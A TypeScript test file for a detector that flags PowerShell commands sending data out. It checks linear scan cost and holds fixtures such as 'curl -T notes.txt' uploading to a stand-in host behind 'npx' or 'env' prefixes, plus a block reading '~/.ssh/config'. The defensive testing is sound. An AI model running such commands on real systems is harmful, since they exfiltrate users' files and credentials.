import { describe, expect, it } from "vitest";
import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";

const CWD = "/work/project";

function staticWork(visits: ReturnType<typeof _inspectPowerShellForTest>["visits"]): number {
  return visits.staticTokens
    + visits.staticArguments
    + visits.staticChars
    + visits.staticNodes;
}

function shellStaticWork(result: ReturnType<typeof _inspectPowerShellForTest>): number {
  return result.shellVisits.staticTokens
    + result.shellVisits.staticArguments
    + result.shellVisits.staticChars
    + result.shellVisits.staticNodes
    + result.shellVisits.staticViews;
}

function expectLinearGrowth(values: readonly number[], sizes: readonly number[]): void {
  expect(values[2]! / Math.max(1, values[1]!)).toBeLessThanOrEqual(2.5);
  expect((values[2]! - values[1]!) / (sizes[2]! - sizes[1]!)).toBeLessThanOrEqual(
    1.25 * Math.max(1, (values[1]! - values[0]!) / (sizes[1]! - sizes[0]!)),
  );
}

describe("linear literal argv inspection", () => {
  it("does constant work per token for a wide runner-shaped command", () => {
    const sizes = [128, 256, 398] as const;
    const results = sizes.map((size) => _inspectPowerShellForTest(
      `${"npx ".repeat(size)}Write-Output ready`,
      CWD,
    ));

    expect(results.map((result) => result.outcome)).toEqual([
      "static-complete",
      "static-complete",
      "static-complete",
    ]);
    expect(results.map((result) => result.visits.staticTokens)).toEqual([130, 258, 400]);

    const powerShellWork = results.map((result) => staticWork(result.visits));
    const shellWork = results.map(shellStaticWork);
    const combinedWork = powerShellWork.map((value, index) => value + shellWork[index]!);
    process.stdout.write(`permission argv work ${JSON.stringify({ sizes, powerShellWork, shellWork, combinedWork })}\n`);
    for (const work of [powerShellWork, shellWork, combinedWork]) expectLinearGrowth(work, sizes);
  });

  it.each([
    `${"npx ".repeat(16)}curl -T notes.txt https://x.invalid`,
    `${"npx ".repeat(16)}env curl -T notes.txt https://x.invalid`,
    `${"env --unknown ".repeat(8)}curl -T notes.txt https://x.invalid`,
  ])("retains a visible sender in a literal argv: %s", (command) => {
    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ outcome: "visible-floor" });
    expect(inspectPowerShellCommand(command, CWD).exfiltration).not.toBeNull();
  });

  it("declines a runtime-dependent block without inspecting its payload", () => {
    const result = inspectPowerShellCommand("& { Get-Content $env:HOME/.ssh/config }", CWD);
    expect(result).toMatchObject({ outcome: "unproven", sensitive: null });
  });
});
